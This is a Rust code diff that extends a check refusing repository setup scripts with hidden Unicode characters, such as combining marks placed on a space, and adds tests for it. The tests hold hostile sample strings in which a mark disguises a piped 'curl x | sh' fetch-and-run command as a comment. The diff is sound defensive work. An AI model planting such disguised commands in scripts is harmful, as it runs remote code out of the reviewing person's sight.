@@ -181,28 +181,47 @@ fn open_settings_file(path: &Path) -> std::io::Result<std::fs::File> {
 
 /// Whether a script read from a repo could hide anything from the person
 /// reading it before it runs (Trojan Source, look-alike spaces that bash
-/// doesn't split words on, format and tag characters). Fail closed: only
-/// ordinary characters pass, and everything else counts as hidden.
+/// doesn't split words on, format and tag characters, combining marks laid
+/// over a space). Fail closed: only ordinary characters pass, and everything
+/// else counts as hidden.
 ///
 /// - ASCII: graphic characters (U+0021–007E), space, tab, newline, and a
 ///   carriage return only as part of CRLF.
 /// - Non-ASCII: a letter or digit (`is_alphanumeric`) that is neither
 ///   whitespace nor a control, and isn't one of the blank fillers that are
-///   letters by category (U+115F–1160, U+17B4–17B5, U+3164, U+FFA0). So
-///   "café" and CJK names in paths and comments still work.
+///   letters by category (U+115F–1160, U+17B4–17B5, U+3164, U+FFA0); or a
+///   combining accent from U+0300–036F other than U+034F (decomposed text).
+/// - And a non-ASCII character never starts a word: it can't come first, or
+///   right after ASCII whitespace or a shell operator or quote
+///   (`; & | ( ) < > ' " \ = $` and the backtick). Combining marks count as
+///   letters, so one placed on a space would otherwise make `<space><mark>#`
+///   read as a comment while bash runs what follows. So "café" (NFC or NFD)
+///   and `src/設定` pass, but `cd 設定` is refused, which is rare.
 pub fn hides_characters(script: &str) -> bool {
     let mut chars = script.chars().peekable();
+    let mut prev: Option<char> = None;
     while let Some(c) = chars.next() {
         let ok = match c {
             '\r' => chars.peek() == Some(&'\n'),
             ' ' | '\t' | '\n' | '!'..='~' => true,
             c if c.is_ascii() => false,
             '\u{115f}'..='\u{1160}' | '\u{17b4}'..='\u{17b5}' | '\u{3164}' | '\u{ffa0}' => false,
-            c => c.is_alphanumeric() && !c.is_whitespace() && !c.is_control(),
+            c => {
+                let starts_word = match prev {
+                    None => true,
+                    Some(p) => p.is_ascii_whitespace() || ";&|()<>'\"\\=$`".contains(p),
+                };
+                // U+0300–036F: the Latin combining accents of decomposed
+                // (NFD) text, which aren't letters by property; U+034F (the
+                // grapheme joiner) is invisible and stays out.
+                let accent = ('\u{300}'..='\u{36f}').contains(&c) && c != '\u{34f}';
+                !starts_word && (accent || c.is_alphanumeric()) && !c.is_whitespace() && !c.is_control()
+            }
         };
         if !ok {
             return true;
         }
+        prev = Some(c);
     }
     false
 }
@@ -459,6 +478,43 @@ mod tests {
         let cjk: String = [0x8A2D, 0x5B9A, 0x3059, 0x308B].map(ch).iter().collect();
         let body = format!("[scripts]\nsetup = \"cd ./{cjk} && make\"\n");
         assert_eq!(script(&body), Some(format!("cd ./{cjk} && make")));
+    }
+
+    #[test]
+    fn conductor_setup_refuses_a_combining_mark_that_starts_a_word() {
+        let ch = |cp: u32| char::from_u32(cp).unwrap();
+        let s = |parts: &[&str]| parts.concat();
+        // A mark on the space makes ` <mark>#` look like a comment; bash runs the curl.
+        for cp in [0x0345, 0x05B4, 0x05BC, 0x064E, 0x0363, 0x0652] {
+            let mark = ch(cp).to_string();
+            let body = s(&["[scripts]\nsetup = '''\necho setup ", &mark, "# ; curl x | sh\n'''\n"]);
+            let repo = conductor_repo(&[(CONDUCTOR_SETTINGS, &body)]);
+            assert_eq!(conductor_setup_script(repo.path()), None, "U+{cp:04X}");
+            assert!(hides_characters(&s(&["echo setup ", &mark, "# ; curl x | sh"])), "U+{cp:04X}");
+        }
+        // Straight after an operator, `=`, a quote, `$`, a backslash, or first —
+        // a Hebrew mark and an accent allowed inside words alike.
+        for cp in [0x05BC, 0x0301] {
+            let mark = ch(cp).to_string();
+            for before in ["a;", "a&", "a|", "(", ")", "<", ">", "x=", "'", "\"", "\\", "$", "`", "\t", "\r\n", " ", ""] {
+                let script = s(&[before, &mark, "#;curl x|sh"]);
+                assert!(hides_characters(&script), "U+{cp:04X} after {before:?}");
+            }
+        }
+        // Grapheme joiner U+034F is refused even inside a word.
+        assert!(hides_characters(&s(&["echo a", &ch(0x034F).to_string(), "b"])));
+        // A word that starts with a non-ASCII letter is refused too (rare).
+        let setei: String = [0x8A2D, 0x5B9A].map(ch).iter().collect();
+        assert!(hides_characters(&s(&["cd ", &setei])));
+        // Inside a word they're fine.
+        assert!(!hides_characters("echo café"));
+        assert!(!hides_characters(&s(&["echo cafe", &ch(0x0301).to_string()])));
+        assert!(!hides_characters(&s(&["mkdir -p src/", &setei])));
+        let shalom: String = [0x05E9, 0x05DC, 0x05D5, 0x05DD].map(ch).iter().collect();
+        assert!(!hides_characters(&s(&["echo a", &shalom])));
+        let body = s(&["[scripts]\nsetup = \"mkdir -p src/", &setei, " && echo cafe", &ch(0x0301).to_string(), "\"\n"]);
+        let repo = conductor_repo(&[(CONDUCTOR_SETTINGS, &body)]);
+        assert!(conductor_setup_script(repo.path()).is_some());
     }
 
     #[cfg(unix)]
